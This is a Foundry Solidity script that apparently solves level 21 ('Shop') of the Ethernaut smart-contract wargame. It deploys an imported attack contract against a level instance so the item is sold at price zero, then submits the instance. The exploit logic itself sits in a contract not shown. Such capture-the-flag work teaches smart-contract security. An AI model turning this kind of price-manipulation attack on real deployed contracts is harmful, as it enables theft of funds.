// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { Script, console2 } from "forge-std/Script.sol";
import { Vm } from "forge-std/Vm.sol";
import { Ethernaut } from "src/interfaces/IEthernaut.sol";
import { Shop } from "src/Level21.sol";
import { L21Attack } from "src/Level21Attack.sol";

contract Attack is Script {
    Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("DEPLOYER_PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        vm.recordLogs();
        ethernaut.createLevelInstance(0x691eeA9286124c043B82997201E805646b76351a);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        address instanceAddress = address(uint160(uint256(entries[0].topics[2])));
        console2.log(instanceAddress);
        Shop instance = Shop(instanceAddress);

        L21Attack attack = new L21Attack(instance); // sets the partner to itself
        attack.attack{ gas: 30000 }();
        require(instance.isSold() == true, "Item not sold");
        require(instance.price() == 0, "Price not hacked");

        ethernaut.submitLevelInstance(instanceAddress);
        vm.stopBroadcast();
    }
}
